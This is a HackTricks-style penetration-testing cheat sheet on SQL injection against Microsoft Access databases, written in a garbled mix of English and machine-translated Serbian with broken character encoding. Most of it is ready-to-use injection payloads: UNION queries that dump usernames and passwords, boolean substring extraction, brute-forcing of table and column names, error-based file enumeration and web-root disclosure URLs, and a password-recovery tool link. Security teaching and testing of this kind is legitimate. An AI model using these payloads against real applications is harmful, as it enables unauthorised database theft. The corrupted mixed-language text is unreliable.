# MS Access SQL Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Online Playground

* [https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1)

## DB Limitations

### String Concatenation

Konkatenacija stringova je moguƒáa sa `& (%26)` i `+ (%2b)` karakterima.
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### –ö–æ–º–µ–Ω—Ç–∞—Ä–∏

–£ MS Access-—É –Ω–µ–º–∞ –∫–æ–º–µ–Ω—Ç–∞—Ä–∞, –∞–ª–∏ –æ—á–∏–≥–ª–µ–¥–Ω–æ —ò–µ –º–æ–≥—É—õ–µ —É–∫–ª–æ–Ω–∏—Ç–∏ –ø–æ—Å–ª–µ–¥—ö–∏ –¥–µ–æ —É–ø–∏—Ç–∞ –ø–æ–º–æ—õ—É NULL –∫–∞—Ä–∞–∫—Ç–µ—Ä–∞:
```sql
1' union select 1,2 from table%00
```
–ê–∫–æ –æ–≤–æ –Ω–µ —Ä–∞–¥–∏, —É–≤–µ–∫ –º–æ–∂–µ—Ç–µ –∏—Å–ø—Ä–∞–≤–∏—Ç–∏ —Å–∏–Ω—Ç–∞–∫—Å—É —É–ø–∏—Ç–∞:
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### Stacked Queries

Nisu podr≈æane.

### LIMIT

Operator **`LIMIT`** **nije implementiran**. Meƒëutim, moguƒáe je ograniƒçiti rezultate SELECT upita na **prvih N redova tabele koristeƒái operator `TOP`**. `TOP` prihvata kao argument ceo broj, koji predstavlja broj redova koji treba da budu vraƒáeni.
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
Just like TOP you can use **`LAST`** which will get the **redove sa kraja**.

## UNION Upiti/Sub upiti

In a SQLi you usually will want to somehow execute a new query to extract information from other tables. MS Access always requires that in **subupitima ili dodatnim upitima bude naznaƒçen `FROM`**.\
So, if you want to execute a `UNION SELECT` or `UNION ALL SELECT` or a `SELECT` between parenthesis in a condition, you always **need to indicate a `FROM` with a valid table name**.\
Therefore, you need to know a **valid table name**.
```sql
-1' UNION SELECT username,password from users%00
```
### Chaining equals + Substring

{% hint style="warning" %}
Ovo ƒáe vam omoguƒáiti da ekfiltrirate vrednosti trenutne tabele bez potrebe da znate ime tabele.
{% endhint %}

**MS Access** omoguƒáava **ƒçudnu sintaksu** kao ≈°to je **`'1'=2='3'='asd'=false`**. Kao ≈°to obiƒçno biva, SQL injekcija ƒáe biti unutar **`WHERE`** klauzule, ≈°to mo≈æemo zloupotrebiti.

Zamislite da imate SQLi u MS Access bazi podataka i znate (ili ste pogodili) da je jedno **ime kolone username**, i to je polje koje ≈æelite da **ekfiltrirate**. Mo≈æete proveriti razliƒçite odgovore web aplikacije kada se koristi tehnika chaining equals i potencijalno ekfiltrirati sadr≈æaj sa **boolean injection** koristeƒái **`Mid`** funkciju za dobijanje podstringova.
```sql
'=(Mid(username,1,3)='adm')='
```
Ako znate **ime tabele** i **kolone** koju ≈æelite da izvuƒçete, mo≈æete koristiti kombinaciju izmeƒëu `Mid`, `LAST` i `TOP` da **izvuƒçete sve informacije** putem boolean SQLi:
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_Feel free to check this in the online playground._

### Brute-forcing Tables names

Kori≈°ƒáenjem tehnike povezivanja jednakosti mo≈æete takoƒëe **bruteforce-ovati imena tabela** sa neƒçim poput:
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
Mo≈æete takoƒëe koristiti tradicionalniji naƒçin:
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_Feel free to check this in the online playground._

* Sqlmap uobiƒçajeni nazivi tabela: [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
* Postoji jo≈° jedna lista na [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

### Brute-Forcing naziva kolona

Mo≈æete **brute-force trenutne nazive kolona** koristeƒái trik sa povezivanjem jednakosti sa:
```sql
'=column_name='
```
Ili sa **group by**:
```sql
-1' GROUP BY column_name%00
```
Ili mo≈æete koristiti brute-force za imena kolona **druge tabele** sa:
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### Dumping data

Veƒá smo razgovarali o [**tehnici povezivanja jednakosti**](ms-access-sql-injection.md#chaining-equals-+-substring) **za iskopavanje podataka iz trenutne i drugih tabela**. Ali postoje i drugi naƒçini:
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
Ukratko, upit koristi "if-then" izjavu kako bi aktivirao "200 OK" u sluƒçaju uspeha ili "500 Internal Error" u suprotnom. Iskori≈°ƒáavanjem TOP 10 operatora, moguƒáe je izabrati prvih deset rezultata. Naknadna upotreba LAST omoguƒáava da se razmatra samo 10. tuple. Na takvoj vrednosti, koristeƒái MID operator, moguƒáe je izvr≈°iti jednostavnu poredbu karaktera. Pravilnom promenom indeksa MID i TOP, mo≈æemo izvuƒái sadr≈æaj polja "username" za sve redove.

### Time Based

Proverite [https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676\(v=technet.10\)?redirectedfrom=MSDN)

### Other Interesting functions

* `Mid('admin',1,1)` uzmi podstring sa pozicije 1 du≈æine 1 (poƒçetna pozicija je 1)
* `LEN('1234')` uzmi du≈æinu stringa
* `ASC('A')` uzmi ascii vrednost karaktera
* `CHR(65)` uzmi string iz ascii vrednosti
* `IIF(1=1,'a','b')` if then
* `COUNT(*)` prebroj broj stavki

## Enumerating tables

Sa [**ovde**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database) mo≈æete videti upit za dobijanje imena tabela:
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
Meƒëutim, imajte na umu da je vrlo tipiƒçno pronaƒái SQL injekcije gde **nemate pristup za ƒçitanje tabele `MSysObjects`**.

## Pristup fajl sistemu

### Potpuna putanja do web root direktorijuma

Znanje o **apsolutnoj putanji web root-a mo≈æe olak≈°ati dalja napada**. Ako gre≈°ke aplikacije nisu potpuno sakrivene, putanja direktorijuma mo≈æe biti otkrivena poku≈°ajem selektovanja podataka iz nepostojeƒáe baze podataka.

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Access odgovara sa **porukom o gre≈°ci koja sadr≈æi punu putanju web direktorijuma**.

### Enumeracija fajlova

Sledeƒái napadni vektor mo≈æe se koristiti za **inferenciju postojanja fajla na udaljenom fajl sistemu**. Ako navedeni fajl postoji, MS Access aktivira poruku o gre≈°ci koja obave≈°tava da je format baze podataka neva≈æeƒái:

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

Drugi naƒçin za enumeraciju fajlova sastoji se u **navoƒëenju stavke database.table**. **Ako** navedeni **fajl postoji**, MS Access prikazuje **poruku o gre≈°ci formata baze podataka**.

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### Pogaƒëanje imena .mdb fajla

**Ime baze podataka (.mdb)** mo≈æe se inferirati sledeƒáim upitom:

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

Gde je **name\[i] ime .mdb fajla** i **realTable je postojeƒáa tabela** unutar baze podataka. Iako ƒáe MS Access uvek aktivirati poruku o gre≈°ci, moguƒáe je razlikovati izmeƒëu neva≈æeƒáeg imena fajla i va≈æeƒáeg .mdb imena fajla.

### .mdb alat za otkljuƒçavanje lozinki

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html) je besplatni alat koji se mo≈æe koristiti za oporavak glavne lozinke baze podataka Microsoft Access 95/97/2000/XP ili Jet Database Engine 3.0/4.0.

## Reference

* [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
